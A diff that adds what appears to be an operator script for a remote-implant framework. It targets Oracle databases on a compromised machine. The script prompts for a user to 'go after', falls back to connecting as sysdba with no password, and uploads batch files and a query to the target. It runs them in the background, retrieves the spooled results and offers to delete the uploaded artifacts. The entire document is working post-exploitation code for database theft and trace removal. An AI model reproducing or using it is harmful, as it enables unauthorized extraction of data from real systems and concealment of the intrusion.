@@ -1,0 +1,177 @@
+@echo off;
+@include "_PFreIncludes.dsi";
+@include "_Commands.dsi";
+string $uploadDirPath;
+string $tempDownloadDirPath;
+_PFre_GetTempDownloadDir($tempDownloadDirPath);
+@record on;
+`local environment -var SQL_SCRIPT_DIR -get`;
+@record off;
+GetCmdData("environment::value::value", $uploadDirPath);
+
+string $myHomebase;
+@record on;
+`environment -var HOME_BASE -get`;
+@record off;
+GetCmdData("environment::value::value", $myHomebase);
+
+if (! defined( $uploadDirPath )) 
+{
+	_PFre_MyBanner("We need to identify where the SQL scripts are located on the local machine.", "\n");
+	GetInput("Please enter the full path to where the SQL scripts are located.", $uploadDirPath);
+	echo "\n";
+	`local environment -var SQL_SCRIPT_DIR -set $uploadDirPath`;
+}
+string $dbsid;
+@record on;
+`environment -var ORACLE_SID -get`;
+@record off;
+GetCmdData("environment::value::value", $dbsid);
+
+
+echo "\n";
+string $sUsername;
+GetInput("What is the USERNAME you are wanting to go after", $sUsername);
+string $sPassword;
+echo "\n";
+if (prompt ("Do you have a password for this user?"))
+{
+	GetInput("What is the PASSWORD for this user?", $sPassword);
+}
+
+string $sUsernamePassword;
+if (defined($sPassword))
+{
+	$sUsernamePassword = "$sUsername/$sPassword";
+}
+else
+{
+	$sUsernamePassword = "/ as sysdba";
+}
+
+bool $bUsedtemplate = false;
+string $myFilename;
+echo "\n";
+if ( prompt ("Do you want to generate a template file for your query?" ))
+{
+	$bUsedtemplate = true;
+	string $myFile = "$sUsername\_query.sql";
+	if (! prompt ("Is it OK to name the query template: $myFile?"))
+	{
+		GetInput( "What do you want to call this file (e.g $myFile)?", $myFile );
+	}
+	_PFre_MyBanner("Creating scripts ...", "\n");
+	$myFilename = "$tempDownloadDirPath\\$myFile";
+	`local run -command "$uploadDirPath\\mkquery.bat $sUsername > $myFilename" -redirect`;
+
+	_PFre_MyBanner("You will need to make changes to this template to add your custom queries.", "\n");
+}
+else 
+{
+	echo "\n";
+	GetInput ("Enter the full path to your custom query you already have.", $myFilename);
+	echo "\n";
+	_PFre_MyBanner("If you need to make any changes to your script, do it now.", "\n");
+}
+
+string $mypath;
+SplitPath($myFilename, $mypath);
+string $msg = "NOTE: Spooling of the output from the query is handled later in this script,";
+$msg[1] =     "      so PLEASE DON'T include a spool command in your custom query.";
+_PFre_MyBannerMultiLine($msg, "\n");
+#_PFre_MyBanner("Run this command to edit the query.");
+
+#PromptCommand( "local run -command \"cmd /C notepad $myFilename\"");
+_PFre_MyBanner( "Edit the template to add your custom query.");
+
+`local run -command "cmd /C notepad $myFilename"`;
+
+pause;
+
+echo "\n";
+string $sSpoolfile = "dc52.tmp";
+if (! prompt ("Is it OK to spool the query output to the file: dc52.tmp?"))
+{
+	GetInput("Enter the name of the file you want the output of your query written to (e.g. dc52.tmp)", $sSpoolfile);
+}
+
+echo "\n";
+_PFre_MyBanner("Generating file: $tempDownloadDirPath\\dc50.tmp", "\n");
+
+`local run -command "$uploadDirPath\\mkdc50.bat $sSpoolfile $sUsernamePassword > $tempDownloadDirPath\\dc50.tmp" -redirect`;
+
+_PFre_MyBanner("Uploading dc5.bat, dc50.tmp and custom query ($mypath[1] --> dc51.tmp)", "\n");
+int $dc5_id;
+int $dc50_id;
+int $dc51_id;
+_StartCommand("put $uploadDirPath\\dc5.bat -name dc5.bat", $dc5_id);
+_StartCommand("put $tempDownloadDirPath\\dc50.tmp -name dc50.tmp", $dc50_id);
+_StartCommand("put $myFilename -name dc51.tmp", $dc51_id);
+
+echo "Done.\n";
+_PFre_MyBanner("Ready to run the custom query.", "\n");
+
+
+if (prompt ("Do you want to display the output of the query to the screen (ONLY do this if you expect small ammounts of data!)?", false))
+{
+	if (prompt ("Are you sure? (answer NO if you do not want to display to the screen)", false))
+	{
+		@echo on;
+		@echo on;
+		_PFre_RunCmdAndWaitUntilFinished("run -command $myHomebase\\dc5.bat -redirect");
+		@echo off;
+		@echo off;
+	}
+	else
+	{
+		_PFre_RunCmdAndWaitUntilFinished("background run -command $myHomebase\\dc5.bat");
+	}
+}
+else
+{
+	_PFre_RunCmdAndWaitUntilFinished("background run -command $myHomebase\\dc5.bat");
+}
+
+
+echo "\n";
+_PFre_MyBanner("Getting the output from your query...", "\n");
+_PFre_GetAndNameFile("$sSpoolfile", "CustomQueryOutput__$mypath[1]\__");
+echo "\n";
+
+/*****************************************************/
+/* Delete the dc50.tmp file that was auto-generated. */
+/*****************************************************/
+`local delete -file $tempDownloadDirPath\\dc50.tmp`;
+
+if (prompt ("Do you want to delete the files that were uploaded (dc5.bat, dc50.tmp, and dc51.tmp)?"))
+{
+	_PFre_DeleteFileAndStopId("$myHomebase\\dc5.bat", $dc5_id);
+	_PFre_DeleteFileAndStopId("$myHomebase\\dc50.tmp", $dc50_id);
+	_PFre_DeleteFileAndStopId("$myHomebase\\dc51.tmp", $dc51_id);
+	echo "Deleted.\n";
+}
+
+if (prompt ("Do you want to delete the output file that was created: $sSpoolfile? (Make sure the file is finished downloading)"))
+{
+	`del $sSpoolfile`;
+	echo "Deleted.\n";
+}
+
+
+if ($bUsedtemplate == true)
+{
+	if (prompt ("Do you want to delete the custom query that was created ($myFilename)?"))
+	{
+		echo "\n";
+		`local delete -file $myFilename`;
+		_PFre_MyBanner("$myFilename deleted.");
+	}
+	echo "\n";
+}
+
+
+_PFre_MyBanner("Finished with this custom query!", "\n");
+@echo on;
+return true;
+
+
